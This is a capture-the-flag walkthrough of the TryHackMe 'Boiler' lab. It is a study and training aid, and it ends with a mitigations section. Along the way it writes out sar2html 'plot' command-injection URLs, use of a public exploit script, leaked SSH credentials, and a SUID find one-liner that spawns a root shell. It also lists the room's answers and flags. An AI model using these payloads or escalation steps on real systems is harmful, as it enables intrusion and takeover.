# Boiler CTF Walkthrough

**Target:** Boiler  
**Source:** [TryHackMe](https://tryhackme.com/room/boilerctf2)  
**Difficulty:** Medium/Intermediate  
**Target IP:** 10.114.145.234

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Anonymous FTP Access](#anonymous-ftp-access)
- [Web Enumeration](#web-enumeration)
- [robots.txt & Encoded Hash](#robotstxt--encoded-hash)
- [Joomla & sar2html Discovery](#joomla--sar2html-discovery)
- [sar2html RCE & Credential Disclosure](#sar2html-rce--credential-disclosure)
- [Foothold via SSH (basterd)](#foothold-via-ssh-basterd)
- [Lateral Movement to stoner](#lateral-movement-to-stoner)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Boiler is a medium-difficulty Linux box centered on thorough enumeration. The
objective is to gain a foothold and escalate to root, capturing both the user
and root flags. The attack chain begins with anonymous FTP access leaking a
ROT13 hint, moves through extensive web enumeration that surfaces a Joomla
install hiding a vulnerable **sar2html 3.2.1** application, leverages a known
`plot` command-injection RCE to read SSH credentials from a log file, then
performs lateral movement through plaintext credentials in a backup script,
and finishes with a classic SUID `find` GTFOBins privilege escalation to root.

**Key Skills Required:**
- Network scanning and service enumeration
- Anonymous FTP enumeration and ROT13 decoding
- Web directory brute forcing and hidden endpoint discovery
- Decimal/Base64/MD5 decoding chain
- Identifying and exploiting sar2html 3.2.1 RCE (`plot` parameter)
- Credential discovery and lateral movement (SSH / backup script)
- SUID binary privilege escalation via GTFOBins (`find`)

---

## Reconnaissance

### Network Scanning

A full-port version and script scan reveals four services:

```bash
nmap -sV -sC -p- 10.114.145.234
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.3 (anonymous login allowed) |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |
| 10000/tcp | http | MiniServ 1.930 (Webmin httpd) |
| 55007/tcp | ssh | OpenSSH 7.2p2 Ubuntu |

Notable details from the scan:

- Anonymous FTP login is permitted on port 21.
- The web root on port 80 has a `robots.txt` with one disallowed entry.
- Webmin (MiniServ 1.930) runs on the highest web port, 10000.
- SSH is running on a non-standard high port, 55007.

> **Q2 — What is on the highest port?** `ssh` (55007)
> **Q3 — What's running on port 10000?** `webmin`

A search for exploits against MiniServ 1.930 turns up nothing usable for this
specific version.

> **Q4 — Can you exploit the service running on that port?** `nay`

---

## Anonymous FTP Access

Logging in anonymously exposes a single hidden file:

```bash
ftp 10.114.145.234
Name: anonymous
230 Login successful.

ftp> ls -la
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt

ftp> get .info.txt
```

The file contains a ROT13-encoded message:

```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

> **Q1 — File extension after anon login:** `txt`

Decoding the ROT13 string (via [rot13.com](https://rot13.com/)) yields a hint
that simply reinforces the room's theme:

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

---

## Web Enumeration

### robots.txt & Encoded Hash

The `robots.txt` file on port 80 lists a series of decoy paths plus one block
of decimal-encoded data:

```bash
curl http://10.114.145.234/robots.txt
```

```
User-agent: *
Disallow: /
/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 ...
```

Most paths are rabbit holes (`/yellow/not/a+rabbit/hole/or/is/it`). The decimal
block decodes through a short chain. First, decimal → ASCII:

```bash
echo "079 084 108 105 ..." | awk '{for(i=1;i<=NF;i++) printf "%c", $i; print ""}'
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
```

Then Base64 → string (via [CyberChef](https://gchq.github.io/CyberChef/)):

```
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK  →  99b0660cd95adea327c54182baa51584
```

Finally, the resulting MD5 hash is cracked
(via [CrackStation](https://crackstation.net/)):

```
hash:   99b0660cd95adea327c54182baa51584
type:   md5
result: kidding
```

The cracked value `kidding` is another taunt — a dead end confirming the room's
emphasis on enumeration over shortcuts.

---

## Joomla & sar2html Discovery

A directory brute force against the web root reveals a Joomla CMS:

```bash
gobuster dir -u http://10.114.145.234 \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```
manual    (Status: 301)
joomla    (Status: 301)
```

> **Q5 — What CMS can you access?** `Joomla`

Enumerating inside `/joomla` exposes a number of unusual underscore-prefixed
directories:

```bash
gobuster dir -u http://10.114.145.234/joomla \
  -w /usr/share/wordlists/dirb/common.txt
```

```
_archive   (Status: 301)
_database  (Status: 301)
_files     (Status: 301)
_test      (Status: 301)
~www       (Status: 301)
administrator, bin, build, cache, components, ...
```

The `_files` and `_test` endpoints stand out. `_files` returns another Base64
taunt (`VjJodmNITnBaU0JrWVdsemVRbz0K`), but `_test` serves a full **sar2html**
web interface:

```bash
curl http://10.114.145.234/joomla/_test/
```

The page header and donate link identify it as **sar2html**, a SAR performance
report viewer.

---

## sar2html RCE & Credential Disclosure

sar2html 3.2.1 is vulnerable to a `plot`-parameter command injection. A quick
search confirms the public exploit:

```bash
searchsploit sar2html
```

```
sar2html 3.2.1 - 'plot' Remote Code Execution     | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution         | php/webapps/47204.txt
```

```bash
cp /usr/share/exploitdb/exploits/php/webapps/49344.py exploit.py
python3 exploit.py
Enter The url => http://10.114.145.234/joomla/_test/index.php
Command => ls
HPUX
Linux
SunOS
index.php
log.txt
sar2html
sarFILE
```

The injection can also be triggered directly in the browser; output appears in
the host drop-down menu:

```
http://10.114.145.234/joomla/_test/index.php?plot=;ls
http://10.114.145.234/joomla/_test/index.php?plot=;cat+log.txt
```

> **Q6 — The interesting file name in the folder?** `log.txt`

Reading `log.txt` leaks SSH credentials embedded in a fake SSH log:

```bash
Command => cat log.txt
...
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from
  10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
...
```

> **Recovered credentials:** `basterd : superduperp@$$`

---

## Foothold via SSH (basterd)

Using the leaked credentials on the non-standard SSH port lands the first
shell:

```bash
ssh basterd@10.114.145.234 -p 55007
basterd@10.114.145.234's password: superduperp@$$

$ whoami
basterd
$ python -c 'import pty;pty.spawn("/bin/bash")'
basterd@Vulnerable:~$
```

> **Foothold:** `basterd`

`basterd` has no sudo rights:

```bash
basterd@Vulnerable:~$ sudo -l
Sorry, user basterd may not run sudo on Vulnerable.
```

---

## Lateral Movement to stoner

The home directory holds a backup script with a second user's password stored
in a comment:

```bash
basterd@Vulnerable:~$ cat backup.sh
```

```bash
REMOTE=1.2.3.4
SOURCE=/home/stoner
TARGET=/usr/local/backup
USER=stoner
#superduperp@$$no1knows
...
```

> **Q7 — Where was the other user's pass stored (no extension, just the name)?** `backup`

> **Recovered credentials:** `stoner : superduperp@$$no1knows`

Switching to `stoner` via SSH:

```bash
ssh stoner@10.114.145.234 -p 55007
stoner@10.114.145.234's password: superduperp@$$no1knows

stoner@Vulnerable:~$ whoami
stoner
```

> **Foothold:** `stoner`

---

## User Flag

The user flag lives in a `.secret` file in `stoner`'s home directory:

```bash
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

> **Q8 — user.txt:** `You made it till here, well done.`

---

## Privilege Escalation

Checking `stoner`'s sudo rights reveals only a decoy binary:

```bash
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

Enumerating SUID binaries surfaces the real escalation path — `find` carries
the SUID bit:

```bash
stoner@Vulnerable:~$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/find
...
```

> **Q9 — What did you exploit to get the privileged user?** `find`

Per [GTFOBins](https://gtfobins.org/gtfobins/find/#shell), a SUID `find` can
spawn a privileged shell. The `-p` flag preserves the effective UID:

```bash
stoner@Vulnerable:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

> **Privilege escalation:** `stoner` → `root`

---

## Root Flag

```bash
# cd /root
# cat root.txt
It wasn't that hard, was it?
```

> **Q10 — root.txt:** `It wasn't that hard, was it?`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `You made it till here, well done.` | `/home/stoner/.secret` |
| Root flag | `It wasn't that hard, was it?` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Anonymous FTP Enabled (Low)

**Description:** vsftpd 3.0.3 permitted anonymous login, exposing a hidden
`.info.txt` file.

**Impact:** Information disclosure (room hint); a foothold for an attacker to
begin enumeration without credentials.

**Mitigation:**
- Disable anonymous FTP access unless explicitly required.
- Avoid storing any files — even hints — on anonymously accessible shares.

### 2. Sensitive Data Exposure via robots.txt (Low)

**Description:** `robots.txt` exposed an encoded data block and a list of paths
that could be enumerated by any visitor.

**Impact:** Information leakage that aids reconnaissance.

**Mitigation:**
- Do not use `robots.txt` to "hide" sensitive paths; it is publicly readable.
- Enforce proper access controls on directories rather than obscurity.

### 3. Outdated, Vulnerable sar2html (Critical)

**Description:** A sar2html 3.2.1 instance was exposed under
`/joomla/_test/` and is vulnerable to `plot`-parameter command injection
(public exploit available).

**Impact:** Unauthenticated remote code execution as `www-data`.

**Mitigation:**
- Remove unused/legacy applications from production web roots.
- Patch or replace vulnerable software; restrict access to internal tools.

### 4. Plaintext Credentials in Log/Files (High)

**Description:** SSH credentials for `basterd` were written into `log.txt`, and
`stoner`'s password was stored as a comment in `backup.sh`.

**Impact:** Initial foothold and lateral movement between users.

**Mitigation:**
- Never store plaintext credentials in logs, scripts, or comments.
- Use a secrets manager and key-based authentication.

### 5. SUID `find` Binary (Critical)

**Description:** The `find` binary carried the SUID bit, allowing any user to
spawn a root shell via the documented GTFOBins technique.

**Impact:** Full privilege escalation to `root`.

**Mitigation:**
- Remove unnecessary SUID bits from binaries (`chmod u-s`).
- Audit SUID/SGID binaries regularly and apply least privilege.

---

## Attack Chain Summary

```
Nmap scan → 4 open ports (FTP, HTTP, Webmin, SSH:55007)
    ↓
Anonymous FTP → .info.txt → ROT13 hint (enumeration is key)
    ↓
robots.txt → decimal → Base64 → MD5 "kidding" (rabbit hole)
    ↓
gobuster → /joomla → /joomla/_test → sar2html 3.2.1
    ↓
searchsploit → 49344.py → plot RCE → cat log.txt
    ↓
log.txt → basterd : superduperp@$$
    ↓
ssh basterd@host:55007 → foothold
    ↓
backup.sh → stoner : superduperp@$$no1knows
    ↓
ssh stoner → User flag: You made it till here, well done.
    ↓
find / -perm -u=s → SUID find
    ↓
find . -exec /bin/sh -p \; -quit → root
    ↓
Root flag: It wasn't that hard, was it?
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| FTP client | Anonymous login and file retrieval |
| ROT13 / CyberChef / CrackStation | Decoding ROT13, Base64, decimal, and MD5 |
| Gobuster | Web directory enumeration |
| cURL | Inspecting robots.txt and hidden endpoints |
| searchsploit / exploit 49344.py | Identifying and exploiting sar2html RCE |
| ssh | Foothold and lateral movement on port 55007 |
| GTFOBins (find) | SUID privilege escalation to root |

---

## References

- [TryHackMe — Boiler CTF](https://tryhackme.com/room/boilerctf2)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [Exploit-DB — sar2html 3.2.1 'plot' RCE (49344)](https://www.exploit-db.com/exploits/49344)
- [GTFOBins — find](https://gtfobins.org/gtfobins/find/#shell)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [CrackStation](https://crackstation.net/)
- [ROT13](https://rot13.com/)

---
